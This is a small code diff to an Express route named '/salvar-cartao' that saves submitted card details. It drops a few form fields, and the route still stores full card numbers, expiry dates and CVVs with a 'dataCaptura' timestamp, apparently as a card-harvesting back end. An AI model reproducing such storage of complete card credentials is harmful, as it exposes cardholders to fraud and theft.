@@ -8,26 +8,20 @@ router.post('/salvar-cartao', async (req, res) => {
       email,
       emailConfirm,
       nome,
-      celular,
       numero,
       validade,
       cvv,
-      nomeCartao,
-      parcelas,
-      doisCartoes
+      nomeCartao
     } = req.body;
 
     const novoCartao = new Cartao({
       email,
       emailConfirm,
       nome,
-      celular,
       numero,
       validade,
       cvv,
       nomeCartao,
-      parcelas,
-      doisCartoes,
       dataCaptura: new Date()
     });
 
